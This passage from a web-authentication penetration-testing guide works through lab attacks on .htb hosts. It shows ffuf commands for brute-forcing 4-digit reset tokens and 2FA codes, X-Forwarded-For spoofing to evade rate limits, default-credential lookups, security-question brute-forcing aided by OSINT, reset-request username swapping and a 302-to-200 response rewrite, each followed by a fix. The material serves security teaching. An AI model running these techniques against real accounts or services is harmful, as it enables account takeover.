- **Catch any active token** — if several users are resetting passwords at once, *any* valid token in the 0000–9999 space will hit. You''re opportunistically hijacking whoever happens to be mid-reset. Fast, but you don''t choose the victim.
- **Target a specific user** — first trigger a reset *for your chosen victim* (e.g. submit the "forgot password" form for `admin`) so a token definitely exists for that account, then brute-force. Now the hit resets the account you want. This is the reliable path for a planned account takeover.

Either way, the short numeric space plus no rate limiting is what makes it work in seconds.

**More detail — estimating whether a token is brute-forceable.** The feasibility comes down to the **keyspace** (how many possible values) versus your **request rate** and any **expiry window**. A 4-digit numeric token is 10⁴ = 10,000 values — seconds to exhaust. Compare that to what a *secure* token looks like:

| Token format | Keyspace | Brute-forceable? |
|--------------|----------|------------------|
| 4-digit numeric | 10,000 | Yes, trivially |
| 6-digit numeric | 1,000,000 | Borderline (needs no rate limit + long expiry) |
| 8 hex chars | ~4.3 billion | Impractical |
| 32 hex chars (128-bit) | 3.4 × 10³⁸ | No |
| UUIDv4 | 122 bits of randomness | No |

If a token is long *and* random *and* short-lived *and* single-use *and* rate-limited, brute-forcing is off the table — which is exactly the set of defenses to recommend.

**More detail — GET token means it can leak elsewhere, too.** Because this token rides in a **GET parameter** (`?token=...`), it''s also exposed in browser history, server access logs, proxy logs, and the `Referer` header sent to any third-party resource the reset page loads. So even a "strong" token weakens if it''s placed in the URL. Note this as a secondary finding and recommend delivering reset tokens in a way that doesn''t end up in logs (e.g. a POST body or a short-lived, single-use link).

---

### Documentation Example (CTF-style write-up)

> **Finding:** 4-digit password reset token is brute-forceable → account takeover.
>
> **Reproduction:**
> ```bash
> $ seq -w 0 9999 > tokens.txt
> $ ffuf -w tokens.txt -u "http://weak_reset.htb/reset_password.php?token=FUZZ" \
>   -fr "The provided token is invalid"
> # -> 6182 (200) -> loads admin''s reset page
> ```
>
> **Evidence / Notes:** Reset token is a 4-digit number (10,000 values) with no rate limiting, allowing exhaustive brute-force in seconds and takeover of any account mid-reset. **Severity: Critical.** Fix: use long, cryptographically random tokens, short expiry, single-use, and rate limiting.
>
> **Screenshot placeholder:** `[ Attach ffuf valid-token hit + reset page for admin ]`

---

# 6. Brute-Forcing 2FA Codes

---

## 6.1 How 2FA Works

Two-factor authentication adds a second layer on top of the password, typically combining knowledge (the password) with ownership (a 2FA device) — though any two of the three categories qualify. The goal is that even if an attacker steals the password, they still can''t log in without the second factor. A very common implementation is a **time-based one-time password (TOTP)**: a short numeric code generated by an authenticator app or sent via SMS, valid for a short window. 2FA meaningfully raises the bar for attackers and reduces successful account breaches — *when implemented correctly*. The weakness this section targets is when the TOTP is too short and the app doesn''t limit how many codes you can try.

**More detail — what "TOTP" actually means.** TOTP stands for **Time-based One-Time Password**. The authenticator app and the server share a secret and both compute the same code from that secret plus the current time, rounded to a window (classically 30 seconds). Because both sides know the secret and the time, they independently arrive at the same 6-digit (ideally) code without any network exchange — which is why an authenticator app works offline. The security rests on two things: the code is **short-lived** (only valid for its time window) and **single-use**. When an implementation makes the code too *short* (4 digits), accepts it across *many* windows, or doesn''t *limit guesses*, the time-based protection collapses into a tiny, brute-forceable number — exactly the lab scenario.

**More detail — why 4 digits is the real bug (and 6 isn''t enough alone).** A 4-digit code is 10,000 possibilities; at even a modest request rate with no limiting, you exhaust it in seconds. A 6-digit code is 1,000,000 — but that *only* helps if the server also enforces a short validity window and caps attempts. If a 6-digit code never expires and allows unlimited guesses, it too falls (just slower). So the complete defense is **length + short validity + attempt limiting** together; any one alone is insufficient.

---

## 6.2 Attacking TOTP Codes

TOTP codes usually consist only of digits, which makes them guessable if they''re short and the app allows unlimited submissions. In this lab we assume we already phished valid credentials (`admin:admin`) but the app enforces 2FA with a **4-digit** code — only 10,000 possibilities. Since there''s no protection against submitting many wrong codes, we brute-force the correct one. The TOTP is sent in the `otp` POST parameter, and we must include our authenticated session''s `PHPSESSID` cookie so the code is tied to our logged-in-but-not-yet-2FA''d session. We filter out the "Invalid 2FA Code" error to find the hit.

**Step 1 — Generate the code wordlist** (0000–9999, zero-padded):

```bash
$ seq -w 0 9999 > tokens.txt
```

**Step 2 — Brute-force the TOTP with ffuf,** including the session cookie:

```bash
$ ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" \
  -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

**Flag-by-flag breakdown:**

- `-w ./tokens.txt` — the 10,000 candidate codes.
- `-b "PHPSESSID=..."` — **cookie**: ties each attempt to your authenticated session (without this, the code has no session to validate against).
- `-d "otp=FUZZ"` — `FUZZ` is the OTP in the POST body.
- `-fr "Invalid 2FA Code"` — hide wrong codes, leaving only the correct one.

**Example result:** many `302` hits appear once the correct code passes the check; the **first** hit (`6513`) is the correct TOTP. After it passes, your session is fully authenticated and all requests redirect to `/admin.php`. Simply browse to `/admin.php` to confirm you''re past 2FA.

**Why many hits appear:** once the correct code is submitted, your session becomes fully authenticated, so *subsequent* requests also succeed (they''re already past 2FA) — which is why everything after `6513` also returns `302`. The first hit is the real code.

**More detail — why the session cookie is mandatory here.** A TOTP is meaningless on its own; it only makes sense *relative to a specific half-authenticated session* (you''ve passed the password step but not the 2FA step). The `PHPSESSID` cookie is what tells the server "this OTP belongs to the session that just logged in as admin." Without `-b "PHPSESSID=..."`, every request would start a fresh, unauthenticated session with no pending 2FA challenge, so **every** code would be rejected and you''d never get a hit. Grab a fresh value for this cookie by logging in with the known password first and copying it from the request to `/2fa.php`.

**More detail — single-threaded to respect the time window.** Real TOTP codes rotate (typically every 30 seconds), so in a strict implementation you only have a short window to find the current code. If the lab/app enforces that window, add `-t 1` (one thread) plus timing is still a race — but the labs here usually accept any correct code without expiring it, which is exactly the flaw. In a real engagement, note whether the code *expires*; if it does, you must complete all 10,000 guesses within one window, which a 6-digit code (1,000,000 values) makes infeasible — that length is the proper defense.

**More detail — ordering the wordlist for speed.** Because the hit can be anywhere in `0000`–`9999`, average time is ~5,000 requests. If you have any hint about how the code is generated (some weak implementations aren''t truly random), reorder `tokens.txt` to try likely values first. Otherwise, sequential order is fine; the whole space is small.

**More detail — other 2FA weaknesses to test on this same endpoint.** Brute-forcing a short code is one of several ways 2FA fails. While you''re on the `/2fa.php` endpoint, also probe:

- **Response/flag manipulation** — does the success/failure show only in a `302` vs `200`, a body string, or a JSON field you could tamper with on a proxy?
- **Skipping the step** — after submitting the password, can you navigate straight to `/admin.php` without ever submitting a code? (The "flawed verification state" bug from section 1.3.)
- **Code reuse** — is a correct code accepted more than once, or after its time window?
- **No binding to the user** — is a code generated for *your* account accepted for *another* account''s 2FA step?
- **Weaker fallback** — is there a "use a backup code" or "lost device" path with fewer protections than the primary TOTP?
- **Removing the parameter** — does submitting the 2FA form with an empty/absent `otp` get treated as success by a buggy check?

Any one of these can defeat 2FA without brute-forcing at all, so test them before (or alongside) the brute-force.

---

### Documentation Example (CTF-style write-up)

> **Finding:** 4-digit TOTP with no submission limit → 2FA bypass via brute-force.
>
> **Reproduction:**
> ```bash
> $ seq -w 0 9999 > tokens.txt
> $ ffuf -w tokens.txt -u http://bf_2fa.htb/2fa.php -X POST \
>   -H "Content-Type: application/x-www-form-urlencoded" \
>   -b "PHPSESSID=<session>" -d "otp=FUZZ" -fr "Invalid 2FA Code"
> # -> first hit 6513 ; session now passes 2FA -> /admin.php
> ```
>
> **Evidence / Notes:** With phished creds (`admin:admin`), the 4-digit TOTP (10,000 values) was brute-forced because the app does not limit incorrect OTP submissions. **Severity: Critical** (defeats MFA). Fix: rate-limit/lock OTP attempts, use 6+ digit codes, invalidate the session after N failures.
>
> **Screenshot placeholder:** `[ Attach ffuf first 302 hit + /admin.php access ]`

---

# 7. Weak Brute-Force Protection

---

## 7.1 Rate Limits

Rate limiting controls how many requests a system accepts in a time window, protecting servers from overload and thwarting brute-force attacks. When an attacker hits the limit, the attack stalls — the app may iteratively slow responses until brute-forcing is infeasible, or block the attacker for a period. Crucially, a rate limit should apply to *attackers*, not legitimate users, to avoid denial-of-service for real traffic. Most implementations identify the attacker by **IP address** — but that''s harder than it sounds in the real world. When requests pass through middleboxes (reverse proxies, load balancers, web caches), the source IP the app sees belongs to the *middlebox*, not the attacker. To recover the real client IP, some apps trust HTTP headers like `X-Forwarded-For` — and that trust is exactly the flaw.

**The bypass:** because an attacker can set arbitrary HTTP headers, they can **randomize `X-Forwarded-For`** on each request, making every request look like it comes from a different client and sidestepping the rate limit entirely. This is a real, recurring vulnerability (e.g. CVE-2020-35590).

**More detail — rate limiting vs account lockout (and the DoS trade-off).** These are two different protections that are easy to confuse:

- **Rate limiting** throttles by *source* (IP/header) — "no more than N requests per minute from this client." It protects the server and slows brute-force, but as shown, it''s bypassable when it trusts client-supplied IP headers.
- **Account lockout** disables a *specific account* after N failed logins — "lock `admin` for 15 minutes after 5 bad attempts." It directly stops brute-force against one account, but introduces a **denial-of-service risk**: an attacker can deliberately lock out legitimate users by feeding wrong passwords for their accounts.

Because lockout can be weaponized for DoS, mature designs favor *progressive* defenses — increasing delays, CAPTCHA after a few failures, and MFA — over hard permanent lockouts, and they key rate limits on a *trusted* source signal, not a client header. As an attacker, always check *what* a protection counts (source vs account) and *how* it resets, because that tells you whether to spoof headers, switch to spraying, or wait out a window.

**Example bypass approach** (conceptually, add a changing header per request):

```bash
# Each request carries a different spoofed source IP, defeating IP-based rate limiting
-H "X-Forwarded-For: <random IP per request>"
```

**More detail — other spoofable "client IP" headers to try.** `X-Forwarded-For` is the most common, but different proxies and frameworks read the client IP from different headers. If `X-Forwarded-For` doesn''t move the rate limit, rotate through these one at a time (or send several at once) and watch whether the limit resets:

```text
X-Forwarded-For: 10.0.0.<n>
X-Real-IP: 10.0.0.<n>
X-Client-IP: 10.0.0.<n>
X-Originating-IP: 10.0.0.<n>
X-Remote-IP: 10.0.0.<n>
X-Remote-Addr: 10.0.0.<n>
Forwarded: for=10.0.0.<n>
True-Client-IP: 10.0.0.<n>
CF-Connecting-IP: 10.0.0.<n>
```

**More detail — automating header rotation in ffuf.** You can drive the spoofed IP from a *second* wordlist so each request carries a unique value. ffuf supports multiple `FUZZ` keywords; give the header its own keyword and a list of IPs:

```bash
$ ffuf -w ./passwords.txt:PASS -w ./ips.txt:IP \
  -u http://target.htb/index.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: IP" \
  -d "username=admin&password=PASS" \
  -fr "Invalid username" -mode pitchfork
```

- `-w file:KEYWORD` — binds each wordlist to a named keyword (`PASS`, `IP`).
- `-mode pitchfork` — advances both lists together (one IP per password) rather than every combination (`clusterbomb`).

**More detail — other ways rate limits leak.** Some rate limiters key on the *username* rather than the IP, so spraying **one password across many usernames** (password spraying) avoids tripping a per-account counter. Others reset the counter on a *successful* login attempt, or only count failures to a specific endpoint — so switching endpoints (e.g. the API vs the web form) can dodge them. Always test *what* the limiter counts and *how* it resets.

---

## 7.2 CAPTCHAs

A **CAPTCHA** (Completely Automated Public Turing test to tell Computers and Humans Apart) aims to block bots by forcing a human to complete a challenge — distorted text, image selection, or a simple puzzle — before submitting a form. By making each attempt a manual human task, CAPTCHAs make automated brute-forcing infeasible in most cases, protecting against spam, fake accounts, and login brute-force. They do have downsides: they hurt usability, especially for users with visual impairments or cognitive disabilities. From an attacker''s view, two weaknesses matter. First, a **flawed implementation** may leak the CAPTCHA''s solution in the response (for example, embedding the answer in the HTML), making it trivially bypassable. Second, **automated solvers** — open-source tools, browser extensions, and increasingly AI-driven image/voice recognition — can solve many CAPTCHAs programmatically, eroding their protection.

**Key testing checklist for CAPTCHAs:**

- Is the solution ever present in the HTTP response (HTML, headers, hidden fields)? If so, read it directly.
- Is the CAPTCHA actually *validated* server-side, or can you submit the form without it?
- Is the same CAPTCHA reusable across requests (not regenerated each time)?
- Can an off-the-shelf or AI solver defeat it at scale?

**More detail — the most common CAPTCHA implementation bugs.** Beyond the two weaknesses above, these recurring flaws let you skip the CAPTCHA entirely, often without solving anything:

- **Not required on the request** — the CAPTCHA is a front-end widget, but the server accepts the login POST even when the CAPTCHA field is empty or absent. Just remove the parameter and submit.
- **Validated once, then reusable** — the server checks the CAPTCHA token but doesn''t invalidate it, so one solved token can be replayed on thousands of requests.
- **Predictable or static challenge** — the same image/answer is served repeatedly, or the answer is derivable from a value in the response.
- **Client-side-only check** — JavaScript validates the CAPTCHA and only then enables the submit button; bypassing the JS (sending the request directly with `curl`/Burp) skips it.
- **Weak image/audio** — simple distortion that OCR or an AI model solves instantly, making the CAPTCHA no barrier to automation.
- **Bypass via a different endpoint** — the web login has a CAPTCHA but a mobile API or legacy endpoint for the same auth doesn''t.

The correct defense is a server-side-validated, single-use, freshly-generated challenge (e.g. a modern service like reCAPTCHA/hCaptcha/Turnstile) *enforced on the request itself*, combined with rate limiting — a CAPTCHA alone is never sufficient.

---

### Documentation Example (CTF-style write-up)

> **Finding:** IP-based rate limit bypassed via `X-Forwarded-For` spoofing.
>
> **Reproduction:**
> ```text
> # Baseline: rate limit triggers after N attempts from one IP.
> # Add a rotating X-Forwarded-For header per request -> limit never triggers.
> -H "X-Forwarded-For: 10.0.0.<random>"
> ```
>
> **Evidence / Notes:** The application derives the client IP from the user-controllable `X-Forwarded-For` header, so randomizing it per request defeats the rate limit and re-enables unlimited brute-force (cf. CVE-2020-35590). **Severity: High.** Fix: derive client IP from the trusted proxy layer only; never trust client-supplied forwarding headers for security decisions.
>
> **Screenshot placeholder:** `[ Attach rate-limited vs bypassed request comparison ]`

---

# 8. Default Credentials

---

## 8.1 Why Default Credentials Matter

Many web applications ship with **default credentials** so administrators can log in right after installation. These are meant to be changed immediately — but they frequently aren''t, leaving an easy, authenticated foothold for attackers. Because unchanged defaults are so common and so damaging, *Testing for Default Credentials* is an explicit part of OWASP''s Web Application Security Testing Guide. According to OWASP, classic defaults include `admin` and `password`. During an assessment, whenever you identify a product, device, or framework, it''s worth a quick check for its documented defaults before doing anything more complex — it''s a high-reward, low-effort test.

**More detail — why defaults survive into production.** It feels like it shouldn''t happen, yet unchanged defaults are one of the most common real-world findings. The reasons are human and systemic: an admin installs software "just to test," it quietly becomes production; a device is racked and forgotten; documentation tells users to change the password but nothing *forces* it; or the same default is baked into a deployment image and rolled out hundreds of times. Appliances, IoT, databases, admin consoles, and internal tools are the worst offenders because they''re often considered "internal, so it''s fine." For an attacker this is gold: it''s authenticated access with zero exploitation, no noise, and no brute-force. That''s why default-credential testing sits near the *top* of your checklist, not the bottom — minutes of effort can end the engagement early.

**More detail — fingerprinting the product so you know *which* defaults to try.** You can''t look up defaults until you identify the software. Quick fingerprinting moves: read the page `<title>` and footer, check the **favicon hash** (tools map it to known products), look at `Server`/`X-Powered-By` headers, trigger an error page (frameworks reveal themselves), check `/robots.txt` and common admin paths (`/admin`, `/manager/html` for Tomcat, `/wp-login.php` for WordPress), and view-source for framework-specific markers. Once you know it''s, say, Tomcat or Jenkins or a specific router model, the default-credential lookup is a single search.

---

## 8.2 Testing Default Credentials

There are two main ways to find default credentials for a target. First, use **curated databases and wordlists**: CIRT.net maintains a searchable web database of default passwords (for example, you can look up defaults for Cisco devices identified during a test), and SecLists'' Default-Credentials directory plus the SCADA/SCADAPASS repository list defaults for many vendors. Second, use a **targeted internet search**: if you spot a known product — say a BookStack wiki — searching `"<product> default credentials"` often surfaces the vendor''s install docs stating the defaults. For BookStack, for instance, the documented default admin login is `admin@admin.com:password`.

**Step 1 — Identify the product/device** (banner, title, favicon, docs, error pages).

**Step 2 — Look up its defaults** using one of:

- **CIRT.net** password database (`https://www.cirt.net/passwords`).
- **SecLists Default-Credentials** wordlists.
- **SCADAPASS** repo for industrial/vendor defaults.
- A targeted search: `bookstack default credentials` → docs reveal `admin@admin.com:password`.

**Step 3 — Try the defaults** on the login form before escalating to brute-force or other attacks.

**More detail — where to look for defaults, with concrete sources.** Keep a short mental list of go-to references so this check takes seconds:

| Source | What it covers | How to use |
|--------|----------------|-----------|
| CIRT.net passwords DB | Network devices, appliances (Cisco, HP, etc.) | Search by vendor/model. |
| SecLists `Passwords/Default-Credentials/` | Huge mixed list (`default-passwords.csv`, product files) | Grep for the product name. |
| SCADAPASS (scadastrangelove) | Industrial/ICS & SCADA gear | Browse by vendor. |
| Vendor install docs / GitHub README | App defaults (BookStack → `admin@admin.com:password`) | Search `"<product> default credentials"`. |
| Router/IoT default-password sites | Consumer routers, cameras, DVRs | Search by model number. |

**More detail — grepping SecLists quickly.** When you know the product name, one grep usually surfaces the default instantly:

```bash
$ grep -ri "bookstack" /opt/useful/seclists/Passwords/Default-Credentials/ 2>/dev/null
$ grep -i "cisco"      /opt/useful/seclists/Passwords/Default-Credentials/default-passwords.csv
```

- `-r` recursive, `-i` case-insensitive. The CSV form is `vendor,username,password`, so you get the creds directly.

**More detail — don''t stop at `admin`.** Besides `admin:admin` and `admin:password`, try common variants like `admin:<blank>`, `root:root`, `administrator:password`, `guest:guest`, and the product-branded defaults (`tomcat:tomcat`, `pi:raspberry`, `sa:<blank>` for MSSQL). Also test default creds on *non-web* services you found (SSH, FTP, database ports), since vendors reuse the same defaults across interfaces. And remember default credentials can appear on any authenticated service, not just the main login — admin panels, APIs, and management consoles are prime spots.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Unchanged default administrator credentials grant full access.
>
> **Reproduction:**
> ```text
> # Identify app -> BookStack
> # Search "bookstack default credentials" -> admin@admin.com:password
> # Login succeeds with the default admin account.
> ```
>
> **Evidence / Notes:** The deployed BookStack instance still uses the vendor default admin login (`admin@admin.com:password`), granting full administrative access with no exploitation required. **Severity: Critical.** Fix: force a credential change on first login and remove/disable default accounts.
>
> **Screenshot placeholder:** `[ Attach successful default-cred login ]`

---

# 9. Vulnerable Password Reset

---

## 9.1 Guessable Password Reset Questions

Even when an app has rate limiting and CAPTCHAs, **business-logic flaws** in the password reset flow can still enable account takeover. A common one is relying on **security questions**. Because apps usually provide a fixed, generic set of questions (users can''t write custom ones), *every* user answers the same small pool of questions — and the answers are often predictable or discoverable. Questions like "What is your mother''s maiden name?" or "What city were you born in?" feel personal but can frequently be obtained via OSINT or simply guessed given enough attempts (i.e. weak brute-force protection). If you can answer a target''s security question, you can reset their password.

**More detail — why security questions are inherently weak.** The whole premise is broken: a good authentication secret should be *secret*, *random*, and *changeable*, but security-question answers are none of these. They''re **low-entropy** (there are only so many cities, pet names, or surnames), often **public** (your hometown and school are on LinkedIn; your mother''s maiden name is in genealogy records), **static** (you can''t change where you were born), and **shared across sites** (the same answer unlocks every service that asks the same question). That''s why modern guidance discourages them entirely in favor of real MFA or email/SMS reset links. When you see security questions as the *sole* recovery mechanism, that''s already a finding, independent of whether you can brute-force the specific answer.

**More detail — OSINT beats brute-force here.** For a *targeted* attack, don''t start with a 26,000-city wordlist — start with the person. A few minutes on social media, a personal blog, or public records often hands you the exact answer (hometown, first school, pet''s name), turning the whole attack into a single correct submission with no noise and no rate-limit risk. Brute-force is the fallback when OSINT comes up empty, and even then you narrow the list with whatever you *do* know (country, region, era) to shrink the keyspace dramatically — as the Germany example below shows.

**More detail — where to find the answer with OSINT.** The irony of security questions is that the "secret" is usually published somewhere. Typical sources:

- **Social media** — LinkedIn (hometown, schools, employer), Facebook/Instagram (pets, family, places lived), X/Twitter bios.
- **Public records** — genealogy sites (mother''s maiden name), property and voter records, business registrations.
- **The target''s own content** — personal blogs, "about me" pages, interviews, conference bios.
- **Data breaches** — prior breach dumps sometimes contain the security answers themselves in plaintext.
- **People-search sites** — aggregators that compile addresses, relatives, and history.

A few minutes here often replaces a 26,000-request brute-force with a single correct submission — quieter, faster, and far less likely to trip any protection.

**Step 1 — Build a wordlist of likely answers.** For "What city were you born in?", a world-cities CSV (25,000+ cities) is a strong start. Extract just the city names:

```bash
$ cat world-cities.csv | cut -d '','' -f1 > city_wordlist.txt
$ wc -l city_wordlist.txt
26468 city_wordlist.txt
```

`cut -d '','' -f1` splits each CSV line on commas and keeps field 1 (the city name).

**Step 2 — Brute-force the security answer with ffuf** (include the session cookie tying you to the targeted username, e.g. `admin`):

```bash
$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" \
  -d "security_response=FUZZ" -fr "Incorrect response."
```

- `-b "PHPSESSID=..."` ties the attempt to the target username set in the prior step.
- `-d "security_response=FUZZ"` fuzzes the answer; `-fr "Incorrect response."` hides wrong guesses.

**Example result:** `FUZZ: Houston` — the correct answer, letting you proceed to reset the admin password.

**Step 3 — Narrow the list with OSINT.** If you know the target''s country, filter the cities to shrink the attack dramatically:

```bash
$ cat world-cities.csv | grep Germany | cut -d '','' -f1 > german_cities.txt
$ wc -l german_cities.txt
1117 german_cities.txt
```

Knowing the target is in Germany cuts ~26,000 cities to ~1,100 — far faster.

**More detail — tailoring the wordlist to the question.** The city list only fits "What city were you born in?". Match the wordlist to whatever question the app asks:

| Security question | Good wordlist source |
|-------------------|----------------------|
| City born in / city you live | world-cities CSV (as above) |
| Mother''s maiden name | common surnames list (SecLists `Names/`) |
| First pet''s name | common pet names list |
| First school | local school names (OSINT by region) |
| Favorite color / sports team | small hand-made list (few dozen) |

OSINT shrinks every one of these: a target''s social media, LinkedIn, or public records often *directly reveal* the answer (hometown, school, family names), turning a brute-force into a single correct guess. Always try the OSINT answer first before brute-forcing.

**More detail — why the session cookie is required again.** Just like the 2FA attack, the security-answer check is tied to the username you selected in the previous step, which the server tracks via your `PHPSESSID`. That''s why the command includes `-b "PHPSESSID=..."` — omit it and the server has no "which user am I answering for?" context, so every guess fails. Capture a fresh cookie by starting the reset flow for your target username first.

---

## 9.2 Manipulating the Reset Request

A second logic flaw occurs when the reset flow carries the **username in a parameter** that the attacker can change — often a hidden field — and the app fails to verify that the username stays consistent across the multi-step flow. If the final "set new password" request includes a `username` parameter, you may be able to reset a *different* account''s password by swapping that value. Walking the flow for your own demo account (`htb-stdnt`) reveals the username traveling along in each request; the final request looks like this:

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=htb-stdnt
```

**Step 1 — Note the username is a separate POST parameter** in the final reset request (and also in the earlier steps as a hidden field).

**Step 2 — Swap the username to the victim** (e.g. `admin`) in the final request, skipping or reusing the security-question step:

```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```

If the app doesn''t verify the username matches the one validated earlier in the flow, it resets **admin''s** password to your chosen value — full takeover. The fix is to maintain a consistent, server-side state throughout the entire reset process so the username can''t be swapped mid-flow.

**More detail — the exact tampering steps.** Concretely, the attack sequence with Burp is:

1. Run the reset flow normally for an account you *do* control (`htb-stdnt`) so you reach the final step legitimately.
2. Intercept the final `POST /reset_password.php` request.
3. Change the trailing `username=htb-stdnt` to `username=admin`, leaving your chosen `password=...`.
4. Forward it. If the server trusts that parameter, it sets **admin''s** password to your value.

The reason this works is that the earlier steps (username selection, security answer) were validated against *your* session, but the final step re-reads the target from a client parameter instead of from the validated session state — so you "pass" the checks as yourself, then redirect the actual password change to the victim.

**More detail — the root cause and how to spot it fast.** The flaw is that the app re-derives "whose password am I resetting?" from a **client-supplied parameter** on the *final* step, instead of from the **server-side session** it already established at the start of the flow. To spot it quickly: complete the reset for your own account while watching every request in Burp, and look for the **username (or user id/email) appearing as a parameter** in the security-question or final-reset request. Any time your identity is re-sent by the client rather than remembered by the server, try swapping it. Variants to test include changing a hidden `username`, `email`, `user_id`, or `account` field, and **skipping steps** entirely (jumping straight to `/reset_password.php` with a victim''s username) to see whether the server enforces the flow order.

**More detail — related reset bugs worth checking.** While you''re in the reset flow, also test: **host header poisoning** (does the reset *link* in the email use a `Host` you control, letting you steal the token?), **token leakage** via `Referer` to third-party resources on the reset page, **a response that returns the token** directly instead of emailing it, and **no binding between the token and the account** (a token issued for your account accepted to reset someone else''s). Reset flows are logic-heavy and a rich source of account-takeover bugs.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Password reset flow allows username swap → takeover of any account.
>
> **Reproduction:**
> ```http
> # Guessable security answer (brute-forced): Houston
> # Then in the final reset request, change the username:
> POST /reset_password.php
> password=P@$$w0rd&username=admin      # was username=htb-stdnt
> ```
>
> **Evidence / Notes:** Two issues compound here: (1) guessable security questions brute-forced with a city wordlist; (2) the final reset request trusts a client-supplied `username`, which can be changed to reset another user''s password. Reset the `admin` account without its security answer. **Severity: Critical.** Fix: bind the reset to a server-side session state and verify the username is consistent across every step.
>
> **Screenshot placeholder:** `[ Attach security-answer brute-force + swapped-username reset ]`

---

# 10. Authentication Bypass via Direct Access

---

## 10.1 Direct Access to Protected Resources

The most straightforward authentication bypass is simply **requesting the protected resource directly** from an unauthenticated context. If the app doesn''t properly verify that each request is authenticated — relying only on the login page to gate access — an attacker can skip the login entirely by navigating straight to the protected endpoint. For example, if successful logins redirect to `/admin.php`, an attacker might just request `/admin.php` directly. While a *total* lack of checks is uncommon in the real world, a subtle and more frequent variant exists: the app performs a redirect for unauthenticated users but **doesn''t stop executing**, so the protected content is still generated and sent in the response body before the redirect takes effect.

**Vulnerable PHP pattern** — redirects but keeps running:

```php
if(!$_SESSION[''active'']) {
    header("Location: index.php");
}
// ... execution continues, protected page is still rendered into the body ...
```

The `header("Location: ...")` sets a redirect, but without stopping, PHP continues building the page — so the admin content ends up in the `302` response body. A browser *follows* the redirect and shows the login page, hiding the leak, but the data is right there in the raw response.

**More detail — why the browser "hides" the bug (and tools don''t).** This is the key insight that makes the vulnerability easy to miss and easy to exploit. A **browser** treats a `302` as an instruction: "go to `index.php`," so it immediately navigates away and you only ever *see* the login page — the leaked admin HTML flashes by invisibly in the response body it discarded. A **tool** like `curl` or Burp doesn''t obey that instruction automatically; it shows you the raw `302` response *including its body*, where the protected content is sitting in plain sight. So the vulnerability is invisible through normal browsing but obvious the moment you inspect the raw response — which is exactly why you always check the raw traffic, not just what the browser renders. This same "render vs raw" gap is why penetration testers live in Burp and `curl` rather than trusting the browser''s final view.

---

## 10.2 Forcing the Response with Burp

Because the protected content is already in the `302` response body, you just need to stop the browser from following the redirect — and the easiest way is to **change the status code from `302` to `200`** using Burp Suite. The browser then treats the response as a normal page and renders the protected admin content instead of redirecting to the login.

**Step-by-step:**

1. In Burp, enable **Intercept**.
2. Browse to the protected endpoint `/admin.php` in the browser.
3. Right-click the request → **Do intercept → Response to this request**.
4. Click **Forward** to let the request through and catch the response.
5. In the intercepted response, change the status line from `302 Found` to `200 OK`.
6. **Forward** the modified response.
7. Back in the browser, the protected admin page now renders.

**The fix** is simple — call `exit` after the redirect so execution stops before the protected content is generated:

```php
if(!$_SESSION[''active'']) {
    header("Location: index.php");
    exit;
}
```

**More detail — spotting this without Burp''s intercept.** You don''t strictly need to rewrite the response live; you can often just read the leaked body directly with `curl`, which doesn''t follow redirects by default:

```bash
$ curl -s -i http://<SERVER_IP>:<PORT>/admin.php -b "PHPSESSID=<any/none>"
HTTP/1.1 302 Found
Location: index.php
...
<!-- the full admin page HTML is right here in the body despite the 302 -->
```

- `-i` includes the response headers so you can see the `302`.
- `curl` does **not** auto-follow redirects (unlike a browser), so the leaked body is printed as-is. Add `-L` *only* if you actually want to follow the redirect.

**More detail — the same flaw in other stacks.** This "redirect but keep executing" bug isn''t PHP-specific. The equivalent mistakes are forgetting `return`/`return next()` after a redirect in Node/Express, not returning the `RedirectResponse` early in Flask/Django, or not `return`-ing after `response.sendRedirect()` in a Java servlet. Whenever you see a `302` whose body still contains protected content, this class of bug is the cause — and the fix is always to stop execution immediately after issuing the redirect.

**More detail — related direct-access checks.** While you''re here, also test plain **forced browsing**: request known-protected paths (`/admin.php`, `/dashboard.php`, `/api/admin/*`) with no session at all. If any returns `200` with real content, the app isn''t enforcing auth on that endpoint — the simplest possible bypass, and worth a quick pass with a content-discovery wordlist.

**More detail — paths and tricks to try when forcing access.** Beyond the obvious admin pages, probe these common patterns, each with no authentication:

- **Guessable admin/management paths** — `/admin`, `/administrator`, `/manage`, `/dashboard`, `/panel`, `/console`, `/internal`.
- **API endpoints** — `/api/users`, `/api/admin/*`, `/v1/...`; APIs frequently enforce auth less consistently than the web UI.
- **Static exports / backups** — `/admin.php.bak`, `/export.csv`, report or download endpoints that skip the auth check.
- **Alternate methods** — if `GET /admin` is blocked, try `POST`, `HEAD`, or an unusual verb; some apps only gate specific methods.
- **Case / encoding tricks** — `/Admin`, `/admin/`, `/admin%2f`, or a trailing dot; sloppy routing or access rules sometimes miss these variants.

Run a focused content-discovery scan (e.g. with `ffuf` and a web-content wordlist) *unauthenticated*, then compare against what''s reachable *authenticated* — anything protected that answers without a session is a direct-access finding.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Protected admin content leaked in redirect body (no `exit` after redirect).
>
> **Reproduction:**
> ```text
> 1. Request /admin.php unauthenticated -> server returns 302 with the admin HTML in the body.
> 2. In Burp, intercept the response and change 302 Found -> 200 OK.
> 3. Browser renders the full admin page without authentication.
> ```
>
> **Evidence / Notes:** The auth check issues a redirect but does not stop execution, so the protected page is included in the `302` body. Rewriting the status to `200` reveals it. **Severity: High.** Fix: add `exit;` immediately after the redirect `header()` call.
>
> **Screenshot placeholder:** `[ Attach raw 302-with-body + rendered admin page after 200 rewrite ]`

---

# 11. Authentication Bypass via Parameter Modification

---

## 11.1 Parameter Modification

